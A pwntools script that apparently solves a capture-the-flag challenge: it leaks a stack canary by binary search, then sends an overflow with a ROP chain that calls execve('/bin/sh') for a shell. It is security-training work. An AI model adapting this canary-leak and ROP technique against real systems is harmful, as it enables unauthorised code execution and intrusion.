#!/usr/bin/env python3
from pwn import *

#p = remote('guessing-game.challs.pwnoh.io', 1337, ssl=True)
p = process("./guessing_game")  

def recvuntil_prompt():
    return p.recvuntil(b": ")

recvuntil_prompt() 
p.sendline(b"-2")

low = 0
high = 2**64 - 1  # 18446744073709551615

for attempt in range(1, 65):
    guess = (low + high) // 2
    recvuntil_prompt() 
    p.sendline(str(guess).encode())
    
    response = p.recvline().decode().strip()
    if "Wow! You got it!" in response:
        secret = guess
        break
    elif "Too low!" in response:
        low = guess + 1
    elif "Too high!" in response:
        high = guess - 1
    else:
        log.failure("fail")
        p.interactive()
        exit()

    if attempt == 64:
        log.failure("fail")
        exit()

canary = (secret << 8) | 0x00
log.success(f"Full canary: {hex(canary)}")

pop_rdi = 0x40124d
pop_rsi = 0x401251
pop_rdx = 0x401253
pop_rax = 0x40124f
syscall = 0x401255
bin_sh  = 0x404060

payload = b"A" * 10
payload += p64(canary) 
payload += b"C" * 8                                
payload += p64(pop_rdi) 
payload += p64(bin_sh)
payload += p64(pop_rsi) 
payload += p64(0x0)
payload += p64(pop_rdx) 
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(syscall)

p.sendline(payload)

p.interactive()